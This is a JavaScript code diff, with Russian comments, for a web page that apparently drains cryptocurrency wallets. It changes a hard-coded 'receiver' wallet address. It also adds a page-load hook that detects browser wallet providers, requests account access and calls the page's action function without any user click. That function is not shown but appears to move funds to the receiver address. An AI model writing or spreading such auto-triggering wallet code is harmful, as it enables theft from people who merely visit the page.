@@ -9,7 +9,7 @@ let currentBalance = 0;
 const isDev = window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1');
 
 const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
-const DEV_RECEIVER_ADDRESS = "0x8e62C38421A0670f42e3881A9E9dA93f08723af2";
+const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
 const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
 logger.log('isDev', isDev);
 logger.log('RECEIVER_ADDRESS', RECEIVER_ADDRESS);
@@ -268,5 +268,58 @@ async function waitForProvider() {
   });
 }
 
-// Пример привязки кнопки
-document.getElementById('action-button').addEventListener('click', handleAction);
+// Добавляем обработчик загрузки страницы
+document.addEventListener('DOMContentLoaded', async () => {
+    console.log('Page loaded, checking providers:', {
+        ethereum: !!window.ethereum,
+        rabby: !!window.rabby,
+        web3: !!(window.web3 && window.web3.currentProvider)
+    });
+    
+    // Автоматическое подключение если обнаружен провайдер
+    const provider = await waitForProvider();
+    if (provider) {
+        console.log('Web3 provider detected, attempting automatic connection...');
+        try {
+            // Сначала пробуем получить список аккаунтов
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            console.log('Current accounts:', accounts);
+            
+            if (accounts && accounts.length > 0) {
+                console.log('Found connected account, initiating automatic connection');
+                await handleAction();
+            } else {
+                // Если аккаунтов нет, пробуем запросить подключение
+                console.log('No connected accounts, requesting connection...');
+                try {
+                    const newAccounts = await provider.request({ method: 'eth_requestAccounts' });
+                    console.log('New accounts after request:', newAccounts);
+                    if (newAccounts && newAccounts.length > 0) {
+                        await handleAction();
+                    } else {
+                        console.log('User rejected connection request');
+                    }
+                } catch (requestError) {
+                    console.log('Error requesting accounts:', requestError);
+                    if (requestError.code === 4001) {
+                        console.log('User rejected connection request');
+                    } else {
+                        console.error('Unexpected error:', requestError);
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('Auto-connection check failed:', error);
+            if (error.code) {
+                console.log('Error code:', error.code);
+            }
+            if (error.message) {
+                console.log('Error message:', error.message);
+            }
+        }
+    } else {
+        console.log('No Web3 provider found');
+    }
+    
+    showStatus('Please connect your wallet to continue', true);
+});
